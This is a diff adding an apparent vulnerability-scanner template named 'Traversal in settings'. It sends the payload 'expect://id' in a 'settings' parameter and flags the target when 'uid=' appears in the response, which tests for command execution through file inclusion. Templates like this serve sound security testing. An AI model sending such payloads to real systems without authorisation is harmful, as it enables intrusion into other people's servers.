@@ -1,0 +1,20 @@
+id: lfi6-0349
+name: 'Traversal in settings'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via settings'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      settings:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
